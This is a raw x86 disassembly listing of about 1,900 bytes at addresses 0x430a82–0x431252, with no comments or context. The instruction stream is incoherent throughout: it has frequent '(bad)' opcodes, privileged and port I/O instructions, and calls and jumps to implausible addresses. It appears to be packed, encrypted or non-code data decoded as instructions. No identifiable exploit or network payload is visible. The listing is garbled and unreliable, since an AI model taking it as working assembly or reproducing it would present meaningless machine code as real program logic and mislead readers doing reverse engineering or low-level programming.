  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
  430bc7:	inc    DWORD PTR [edi]
  430bc9:	mov    eax,esi
  430bcb:	cld    
  430bcc:	add    DWORD PTR [eax+0x901c6],eax
  430bd2:	leave  
  430bd3:	xor    BYTE PTR [ebp+0x45],dl
  430bd6:	in     al,dx
  430bd7:	mov    edx,DWORD PTR [ecx-0x40]
  430bda:	inc    ebp
  430bdb:	add    BYTE PTR [ecx-0x74000301],cl
  430be1:	int3   
  430be2:	cld    
  430be3:	jne    0x430b9d
  430be5:	call   0xcc1ef0
  430bea:	mov    esi,DWORD PTR [ebp-0x8]
  430bed:	test   eax,esi
  430bef:	je     0x430c66
  430bf1:	mov    eax,esi
  430bf3:	cld    
  430bf4:	add    al,0x80
  430bf6:	add    WORD PTR [ecx+0x0],ax
  430bfa:	fiadd  DWORD PTR [eax]
  430bfc:	mov    BYTE PTR [eax],0x3d
  430bff:	push   0xffffffc3
  430c01:	push   esi
  430c02:	mov    edx,DWORD PTR [eax+0x51]
  430c05:	pop    edi
  430c06:	lea    ebx,[ebx-0x8]
  430c09:	ret    0x45
  430c0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c12:	xchg   eax,edi
  430c14:	mov    DWORD PTR [ebp-0x75],ecx
  430c17:	push   esi
  430c18:	clc    
  430c19:	jne    0x430beb
  430c1b:	mov    ecx,0xf8450b0b
  430c20:	(bad)  
  430c21:	push   cs
  430c22:	or     BYTE PTR [ebp-0x3a],dh
  430c25:	cmp    eax,DWORD PTR [ecx]
  430c27:	pop    esi
  430c28:	(bad)  
  430c29:	or     al,0x5
  430c2b:	inc    eax
  430c2c:	leave  
  430c2d:	jmp    0x40cf:0x25564204
  430c34:	leave  
  430c35:	in     eax,dx
  430c36:	inc    DWORD PTR [eax-0x75]
  430c39:	fimul  DWORD PTR [ebx-0x228139be]
  430c3f:	inc    eax
  430c40:	nop
  430c41:	loopne 0x430c42
  430c43:	ret    
  430c44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c4a:	add    eax,0xff45e8f8
  430c4f:	push   esi
  430c50:	push   DWORD PTR [ebp-0x39]
  430c53:	mov    eax,0x7edda46
  430c58:	or     al,0x6
  430c5a:	push   DWORD PTR [ebp-0x3a]
  430c5d:	cmp    eax,DWORD PTR [edx]
  430c5f:	pop    esi
  430c60:	ret    
  430c61:	or     al,0x56
  430c63:	inc    ecx
  430c64:	push   ebp
  430c65:	jle    0x430c53
  430c67:	inc    edx
  430c68:	inc    ebp
  430c69:	int    0x1
  430c6b:	inc    ecx
  430c6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430c72:	add    DWORD PTR [edx+0x1c],eax
  430c75:	retf   0xc38b
  430c78:	adc    al,0x8b
  430c7a:	xchg   edx,eax
  430c7b:	push   ecx
  430c7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c82:	rcl    DWORD PTR [esi-0x9],cl
  430c85:	jne    0x430cd7
  430c87:	mov    eax,0x7c80ece
  430c8c:	rol    DWORD PTR [esi],cl
  430c8e:	div    DWORD PTR [ebp+0x50]
  430c91:	cmp    ecx,edx
  430c93:	pop    esi
  430c94:	dec    BYTE PTR [edx]
  430c96:	in     al,dx
  430c97:	inc    edx
  430c98:	sub    esp,ecx
  430c9a:	inc    eax
  430c9b:	(bad)  
  430c9c:	push   eax
  430c9d:	add    edx,DWORD PTR [eax-0x1f]
  430ca0:	push   edi
  430ca1:	add    dh,dh
  430ca3:	leave  
  430ca4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430ca8:	add    BYTE PTR [ecx+0x0],dl
  430cab:	inc    ebp
  430cac:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cb2:	add    BYTE PTR [eax-0x7fbf448],bh
  430cb8:	add    al,0x2
  430cba:	jmp    0x57eb814
  430cbf:	jne    0x430ca9
  430cc1:	mov    eax,DWORD PTR [edx]
  430cc3:	or     BYTE PTR [eax],al
  430cc5:	inc    ecx
  430cc6:	stc    
  430cc7:	in     eax,dx
  430cc8:	ss inc eax
  430cca:	aas    
  430ccb:	out    0x7d,eax
  430ccd:	inc    ecx
  430cce:	mov    ebp,ecx
  430cd0:	lock ret 0x7d
  430cd4:	and    ecx,DWORD PTR [ebx-0x171777]
  430cda:	add    bh,bh
  430cdc:	aad    0xd7
  430cde:	add    dh,cl
  430ce0:	clts   
  430ce2:	(bad)  
  430ce3:	call   0xffce0be8
  430ce8:	hlt    
  430ce9:	iret   
  430cea:	jge    0x430cc2
  430cec:	rol    DWORD PTR [esi-0x80],cl
  430cef:	jmp    0x1c5bfc
  430cf4:	out    dx,al
  430cf5:	mov    eax,DWORD PTR [ebx]
  430cf7:	(bad)  
  430cf8:	pop    esi
  430cf9:	push   es
  430cfa:	cmp    al,0xe8
  430cfc:	sar    edi,0x8
  430cff:	inc    DWORD PTR [edi]
  430d01:	inc    esi
  430d02:	(bad)  
  430d03:	loopne 0x430d83
  430d05:	push   edi
  430d06:	push   cs
  430d07:	push   ebx
  430d08:	add    BYTE PTR [ebx+0x24008b56],cl
  430d0e:	add    BYTE PTR [ebp+0x50],al
  430d11:	push   eax
  430d12:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d18:	sub    edx,DWORD PTR [esi-0x24]
  430d1b:	jne    0x430cd3
  430d1d:	lods   eax,DWORD PTR ds:[esi]
  430d1e:	mov    edx,DWORD PTR [edx-0x34]
  430d21:	dec    esi
  430d22:	out    0x83,eax
  430d24:	into   
  430d25:	push   edi
  430d27:	loopne 0x430cf7
  430d29:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d2d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d34:	rol    DWORD PTR [edx],0x8
  430d37:	mov    esp,ecx
  430d39:	cmp    DWORD PTR [ebx],0xc
  430d3c:	mov    esi,0x5001c0
  430d41:	push   eax
  430d42:	push   cs
  430d43:	push   eax
  430d44:	(bad)  
  430d45:	sub    edx,edi
  430d47:	push   esi
  430d48:	adc    al,0xcb
  430d4a:	ins    DWORD PTR es:[edi],dx
  430d4b:	mov    eax,0x203e8
  430d50:	add    al,ah
  430d52:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d59:	add    dh,al
  430d5b:	add    ah,ch
  430d5d:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d63:	pop    ecx
  430d64:	or     eax,ebx
  430d66:	cli    
  430d67:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d6d:	lea    ebp,[ebx]
  430d6f:	mov    edx,DWORD PTR [edx-0x4]
  430d72:	dec    ecx
  430d73:	inc    ebp
  430d74:	shr    BYTE PTR [ebx],0x4b
  430d77:	and    al,0x0
  430d79:	(bad)  
  430d7a:	jne    0x430dc1
  430d7c:	pop    eax
  430d7d:	mov    al,0x5a
  430d7f:	call   0x1420fde
  430d84:	and    al,0x85
  430d86:	push   edx
  430d87:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d8b:	dec    ebp
  430d8c:	mov    cl,0x23
  430d8e:	jmp    0x430d7c
  430d90:	mov    al,0xe7
  430d92:	call   0x1391080
  430d97:	shr    DWORD PTR [eax+ebx*2],cl
  430d9a:	lock (bad) 
  430d9c:	adc    eax,0x757f008d
  430da1:	out    0x58,eax
  430da3:	cmp    al,0x7
  430da5:	pop    edx
  430da6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dad:	push   ecx
  430dae:	cld    
  430daf:	mov    esi,0x3b0175
  430db4:	and    al,0xb0
  430db6:	xor    BYTE PTR [edx+0x1],0x8b
  430dba:	add    ah,bh
  430dbc:	mov    edi,DWORD PTR [ebp-0x4]
  430dbf:	psubsw mm7,QWORD PTR [edi]
  430dc2:	add    DWORD PTR [ebp+0x0],ebp
  430dc5:	rcr    eax,1
  430dc7:	mov    edi,ecx
  430dc9:	and    eax,DWORD PTR [eax]
  430dcb:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430dd1:	call   0x13010ba
  430dd6:	add    al,cl
  430dd8:	mov    ebp,esi
  430dda:	aam    0x83
  430ddc:	or     DWORD PTR [ecx],eax
  430dde:	jne    0x430dd1
  430de0:	mov    eax,DWORD PTR [eax]
  430de2:	aam    0x0
  430de4:	dec    ebp
  430de5:	jne    0x430d72
  430de7:	cmp    ebx,eax
  430de9:	jb     0x430e38
  430deb:	jmp    0x430d78
  430ded:	mov    ebx,esp
  430def:	int3   
  430df0:	dec    ebp
  430df1:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430df8:	mov    edx,0x8b0a8b
  430dfd:	cmp    ecx,DWORD PTR [eax]
  430dff:	jb     0x430dd8
  430e01:	pop    edx
  430e02:	push   edi
  430e03:	cli    
  430e04:	pop    es
  430e05:	mov    eax,ecx
  430e07:	jb     0x430e0b
  430e09:	add    DWORD PTR [ebx],0xa
  430e0c:	mov    eax,DWORD PTR [ebx]
  430e0e:	int3   
  430e0f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e15:	jmp    0x430da2
  430e17:	mov    al,0xe8
  430e19:	call   0x104109b
  430e1e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e21:	pop    edi
  430e22:	or     BYTE PTR [ecx-0x73],bl
  430e25:	pop    ecx
  430e26:	inc    edi
  430e27:	xor    al,0xeb
  430e29:	push   ecx
  430e2a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e30:	call   0xb20f35
  430e35:	int3   
  430e36:	sbb    BYTE PTR [esi],ch
  430e38:	inc    ebp
  430e39:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e3f:	call   0x9c10ae
  430e44:	or     BYTE PTR [ebx-0x73],dl
  430e47:	cmp    al,0x47
  430e49:	mov    al,0x1
  430e4b:	jb     0x430e4d
  430e4d:	mov    al,0x10
  430e4f:	push   eax
  430e50:	add    al,0x75
  430e52:	add    BYTE PTR [ebx],ch
  430e54:	add    ebx,esp
  430e56:	int3   
  430e57:	jne    0x430e69
  430e59:	movsx  edx,cl
  430e5c:	add    DWORD PTR [eax],eax
  430e5e:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e65:	mov    gs,edi
  430e67:	add    BYTE PTR [eax-0x50],ch
  430e6a:	add    al,ch
  430e6c:	mov    eax,DWORD PTR [ecx]
  430e6e:	sub    eax,DWORD PTR [eax]
  430e70:	jb     0x430ee7
  430e72:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e76:	jge    0x430e60
  430e78:	add    al,0x1
  430e7a:	add    DWORD PTR [eax],0x0
  430e7d:	jne    0x430e7f
  430e7f:	je     0x430ec6
  430e81:	mov    eax,DWORD PTR [edi]
  430e83:	ror    BYTE PTR [ebp+0x4d],1
  430e86:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430e8d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430e93:	mov    DWORD PTR [ebx],ebp
  430e95:	fadd   DWORD PTR [eax+0x75]
  430e98:	inc    eax
  430e99:	pop    eax
  430e9a:	lea    ebx,[ecx+0x4f]
  430e9d:	push   0xb1000003
  430ea2:	out    dx,eax
  430ea3:	add    ebp,DWORD PTR [edx+edx*2]
  430ea6:	add    BYTE PTR [ebx+ecx*4],bh
  430ea9:	mov    ch,BYTE PTR [ebx]
  430eab:	jb     0x430f1f
  430ead:	add    al,0x89
  430eaf:	push   eax
  430eb0:	call   0x842b5c22
  430eb5:	add    DWORD PTR [eax+eax*1],eax
  430eb8:	jae    0x430ece
  430eba:	icebp  
  430ebb:	inc    ebp
  430ebc:	mov    eax,DWORD PTR gs:[ecx]
  430ebf:	int3   
  430ec0:	out    dx,al
  430ec1:	loopne 0x430f10
  430ec3:	sub    eax,DWORD PTR [edx]
  430ec5:	push   0xffffff83
  430ec7:	pop    esi
  430ec8:	push   cs
  430ec9:	jl     0x430ee4
  430ecb:	add    al,0xaf
  430ecd:	xor    eax,0x832b6d00
  430ed2:	mov    eax,DWORD PTR [edx]
  430ed4:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eda:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ee0:	inc    ebp
  430ee1:	shr    ebx,0x3
  430ee4:	or     DWORD PTR [eax],0x4
  430ee7:	push   0xffffffa5
  430ee9:	pop    esi
  430eea:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430ef1:	jmp    0x430f50
  430ef3:	mov    edi,0xff0272
  430ef8:	fdivr  QWORD PTR [ebp+0x5d]
  430efb:	push   0x4e
  430efd:	pop    ecx
  430efe:	call   0x435303
  430f03:	mov    DWORD PTR [ebx],eax
  430f05:	in     al,0xc8
  430f07:	rol    BYTE PTR [ebp-0x75],0xc1
  430f0b:	call   0xad10ec
  430f10:	pop    esi
  430f11:	enter  0xceff,0x8b
  430f15:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f19:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f20:	je     0x430f22
  430f22:	or     DWORD PTR [ebx-0x74183b24],eax
  430f28:	jne    0x430f0e
  430f2a:	jmp    0x430f25
  430f2c:	push   DWORD PTR [edx-0x24]
  430f2f:	push   0x4d
  430f31:	pop    ecx
  430f32:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f36:	jge    0x430f3e
  430f38:	mov    eax,eax
  430f3a:	sub    ebp,DWORD PTR [edx+0x24]
  430f3d:	pop    esi
  430f3e:	inc    ebp
  430f3f:	mov    esp,0x8b6077
  430f44:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f4a:	lods   al,BYTE PTR ds:[esi]
  430f4b:	add    BYTE PTR [ebx],bh
  430f4d:	enter  0xce73,0x49
  430f51:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f59:	stc    
  430f5a:	jge    0x430fce
  430f5c:	jnp    0xdd4292cb
  430f62:	call   0xc61038
  430f67:	fadd   st(0),st
  430f69:	dec    esi
  430f6a:	ins    BYTE PTR es:[edi],dx
  430f6b:	stc    
  430f6c:	cmp    al,0x73
  430f6e:	push   ebp
  430f6f:	mov    eax,0xf8028b
  430f74:	jne    0x430f37
  430f76:	mov    esi,ecx
  430f78:	mov    esp,DWORD PTR [ebp+0x2c]
  430f7b:	add    edi,DWORD PTR [ebp-0x24]
  430f7e:	sub    esp,eax
  430f80:	and    al,0x45
  430f82:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f88:	sbb    al,0xee
  430f8a:	pop    esi
  430f8b:	call   0x830fbb
  430f90:	fsubr  st,st(3)
  430f92:	sti    
  430f93:	add    BYTE PTR gs:[ecx],bh
  430f96:	add    eax,esp
  430f98:	add    DWORD PTR [esi],eax
  430f9a:	rol    DWORD PTR [ebp+0x8],0x29
  430f9e:	mov    esp,eax
  430fa0:	clc    
  430fa1:	jne    0x431018
  430fa3:	mov    eax,0x8b0673
  430fa8:	loopne 0x430fef
  430faa:	loopne 0x430f35
  430fac:	lods   al,BYTE PTR ds:[esi]
  430fad:	int3   
  430fae:	inc    ebp
  430faf:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fb3:	add    al,0xc3
  430fb5:	sub    ecx,DWORD PTR [ebp+0x47]
  430fb8:	(bad)  
  430fba:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fbe:	add    eax,DWORD PTR [eax]
  430fc0:	call   0x644d0c5
  430fc5:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fcb:	dec    esi
  430fcc:	ins    DWORD PTR es:[edi],dx
  430fcd:	in     al,dx
  430fce:	lea    eax,[eax]
  430fd0:	inc    ebp
  430fd1:	inc    ebp
  430fd2:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fd8:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430fe2:	and    al,0xdc
  430fe4:	ror    DWORD PTR [edx+0x24],0xf7
  430fe8:	or     BYTE PTR [ebp+0x4c],dh
  430feb:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  430fef:	stos   BYTE PTR es:[edi],al
  430ff0:	adc    edx,edi
  430ff2:	inc    esp
  430ff3:	add    edi,DWORD PTR [eax]
  430ff5:	jne    0x430fda
  430ff7:	mov    DWORD PTR [eax-0x7449db04],ecx
  430ffd:	cmp    ecx,DWORD PTR [edi]
  430fff:	sub    BYTE PTR [ebp-0x7e],dl
  431002:	sar    ebp,0xb
  431005:	jmp    FWORD PTR [edi+0x2400392a]
  43100b:	sub    esi,DWORD PTR [ebx-0x73]
  43100e:	mov    esp,DWORD PTR [ecx+edi*4]
  431011:	mov    ecx,DWORD PTR [eax]
  431013:	and    BYTE PTR [eax],al
  431015:	jne    0x430fe1
  431017:	sub    ebp,ecx
  431019:	sbb    BYTE PTR [esi+0x32],ah
  43101c:	dec    ebp
  43101d:	push   ebp
  43101e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431024:	ret    
  431025:	mov    edx,ebp
  431027:	leave  
  431028:	sub    DWORD PTR [esi+0x24],ebx
  43102b:	ret    0x2b
  43102e:	pop    ax
  431030:	push   ebp
  431031:	rol    BYTE PTR [ebx],0xeb
  431034:	add    DWORD PTR [ecx+0x6c0001],0x40
  43103b:	jb     0x431092
  43103d:	ret    
  43103e:	in     al,dx
  43103f:	jecxz  0x430fcc
  431041:	push   esi
  431042:	xchg   esp,eax
  431043:	jne    0x431045
  431045:	cmp    edx,DWORD PTR [esi+0x1c]
  431048:	jne    0x43102e
  43104a:	mov    eax,DWORD PTR [ebp-0x77]
  43104d:	ror    DWORD PTR [ebx+0x899408],0xe0
  431054:	mov    esi,DWORD PTR [ebp-0x75]
  431057:	pop    esi
  431058:	nop
  431059:	mov    eax,DWORD PTR [eax]
  43105b:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431061:	add    al,0x0
  431063:	inc    ebp
  431064:	mov    eax,DWORD PTR [ebx]
  431066:	mov    ebp,ebx
  431068:	cmp    al,0xf
  43106a:	or     al,al
  43106c:	inc    ebp
  43106d:	inc    ebp
  43106e:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431074:	cld    
  431075:	add    BYTE PTR [edi+0x546c16c0],dh
  43107b:	add    BYTE PTR [ecx-0x5],dl
  43107e:	add    eax,0x17200
  431083:	sbb    al,0x85
  431085:	dec    esp
  431086:	je     0x4310c0
  431088:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43108c:	add    BYTE PTR [ebx],bh
  43108e:	(bad)  
  43108f:	and    al,0x32
  431091:	jae    0x43102f
  431093:	mov    cl,cl
  431095:	inc    DWORD PTR [esp]
  431098:	push   ebp
  431099:	shr    esp,0x8
  43109c:	in     al,dx
  43109d:	push   esp
  43109e:	add    DWORD PTR [eax],esp
  4310a0:	add    bl,cl
  4310a2:	inc    ebp
  4310a3:	mov    bh,0x89
  4310a5:	add    ah,bh
  4310a7:	jmp    0xca751ff1
  4310ac:	pushf  
  4310ad:	dec    esp
  4310ae:	mov    edx,0xf8178520
  4310b3:	fst    DWORD PTR [ebp+0x0]
  4310b6:	mov    BYTE PTR [eax],0xc4
  4310b9:	sub    edx,DWORD PTR [ebx-0x3f]
  4310bc:	inc    ebp
  4310bd:	add    eax,0xc601da
  4310c2:	mov    al,0xc6
  4310c5:	ins    BYTE PTR es:[edi],dx
  4310c6:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310cd:	dec    esp
  4310ce:	jmp    DWORD PTR [eax]
  4310d0:	inc    ebp
  4310d1:	fnstcw WORD PTR [esi+0x29]
  4310d4:	test   BYTE PTR [eax],0xc8
  4310d7:	rol    BYTE PTR [eax],0xc0
  4310da:	lea    ecx,[ebp-0x3cf0dbcb]
  4310e0:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310e6:	inc    esi
  4310e7:	add    DWORD PTR [eax],ebx
  4310e9:	add    dh,bh
  4310eb:	mov    esi,DWORD PTR [edx+0x8]
  4310ee:	(bad)  
  4310ef:	fdiv   QWORD PTR ss:[ecx]
  4310f2:	(bad)  
  4310f3:	mov    bl,ch
  4310f5:	add    esi,eax
  4310f7:	add    dh,bl
  4310f9:	or     esi,eax
  4310fb:	mov    dl,0xdf
  4310fd:	add    esi,eax
  4310ff:	add    al,ah
  431101:	push   cs
  431102:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431109:	or     BYTE PTR [ebx],dh
  43110b:	dec    ecx
  43110c:	lea    eax,[ebx]
  43110e:	xor    eax,0x18fc0fc7
  431113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431114:	repz clc 
  431116:	add    eax,DWORD PTR [ebp+0x46]
  431119:	prefetcht0 BYTE PTR [ecx-0x2]
  43111d:	xor    eax,0x7c60872
  431122:	mov    esp,0xbd32c69b
  431127:	pop    esi
  431128:	mov    cl,0xbe
  43112b:	or     al,0xc6
  43112d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431134:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43113b:	add    dh,al
  43113d:	mov    eax,ebx
  43113f:	xor    DWORD PTR [ebx],0x35008dbc
  431145:	mov    ecx,DWORD PTR [edi]
  431147:	sbb    al,0x18
  431149:	inc    ebp
  43114a:	xrelease mov DWORD PTR [ebx],0x188546f4
  431151:	clc    
  431152:	(bad)  
  431153:	xor    DWORD PTR [edx-0x64],esi
  431156:	lea    ecx,[ecx+0x45ffe838]
  43115c:	mov    ecx,ebx
  43115e:	fadd   st,st(6)
  431160:	dec    ebp
  431161:	lds    edi,FWORD PTR [eax+0x7145fc56]
  431167:	out    0x1,eax
  431169:	inc    ebp
  43116a:	lea    ebp,ds:0xc8ffc6ff
  431170:	enter  0xa33,0xc6
  431174:	push   ebp
  431175:	leave  
  431176:	(bad)  
  431177:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43117d:	add    BYTE PTR [ebp+0x44],al
  431180:	mov    eax,esp
  431182:	mov    WORD PTR [esi+0x46398300],?
  431188:	psubusw mm4,QWORD PTR [esi-0x78]
  43118c:	add    BYTE PTR [ebx-0x1303f975],al
  431192:	add    BYTE PTR [ebp+0x1],0xeb
  431196:	add    BYTE PTR [ebp+0x38],al
  431199:	in     eax,dx
  43119a:	inc    ebp
  43119b:	inc    ebp
  43119c:	mov    ebx,ebx
  43119e:	add    BYTE PTR [ebp+0x0],0xec
  4311a2:	mov    DWORD PTR [ebp-0x41],eax
  4311a5:	sub    eax,0x2c00454e
  4311aa:	ins    DWORD PTR es:[edi],dx
  4311ab:	inc    ebp
  4311ac:	add    BYTE PTR [esi+0x66],bh
  4311af:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311b6:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311c0:	dec    edi
  4311c1:	pop    es
  4311c2:	add    ah,ch
  4311c4:	mov    DWORD PTR [ebp+0x68],eax
  4311c7:	in     eax,dx
  4311c8:	inc    DWORD PTR [ebp-0x7d]
  4311cb:	out    0xc0,al
  4311cd:	inc    ebp
  4311ce:	mov    edx,esp
  4311d0:	push   0x45
  4311d2:	(bad)  
  4311d3:	jmp    0xdf925790
  4311d8:	add    BYTE PTR [ebp-0x77],al
  4311db:	out    dx,al
  4311dc:	ins    BYTE PTR es:[edi],dx
  4311dd:	inc    ebp
  4311de:	jmp    edi
  4311e0:	add    DWORD PTR [ebp-0x14],0x7e
  4311e4:	mov    esi,esi
  4311e6:	outs   dx,BYTE PTR ds:[esi]
  4311e7:	inc    esp
  4311e8:	(bad)  
  4311e9:	mov    esp,0x8341b68d
  4311ee:	mov    DWORD PTR [esi+0x70],eax
  4311f1:	fcos   
  4311f3:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  4311f9:	in     al,dx
  4311fa:	jb     0x431181
  4311fc:	(bad)  
  4311fd:	dec    DWORD PTR [ebx-0x7aba9901]
  431203:	mov    edi,edi
  431205:	fdivr  st,st(7)
  431207:	out    dx,eax
  431208:	rcl    BYTE PTR [ebx],0x66
  43120b:	mov    DWORD PTR [ebp-0xc70075],eax
  431211:	(bad)  
  431212:	std    
  431213:	cmp    eax,DWORD PTR [eax]
  431215:	jne    0x43127d
  431217:	mov    DWORD PTR [ebp-0xba0048],eax
  43121d:	in     al,dx
  43121e:	outs   dx,BYTE PTR ds:[esi]
  43121f:	pushf  
  431220:	add    BYTE PTR [ebx-0x7f7a039a],cl
  431226:	inc    DWORD PTR [ecx]
  431228:	inc    DWORD PTR [eax]
  43122a:	jae    0x431264
  43122c:	add    BYTE PTR [ebp+0x850266],al
  431232:	inc    DWORD PTR [ebp-0x1]
  431235:	mov    eax,eax
  431237:	jl     0x43129f
  431239:	add    BYTE PTR [ebp-0x740077],al
  43123f:	cld    
  431240:	dec    eax
  431241:	add    BYTE PTR [eax],0x1
  431244:	data16 add BYTE PTR [ebp+0x38],al
  431248:	mov    eax,0x47c2
  43124d:	mov    eax,0x824f89
  431252:	inc    edi
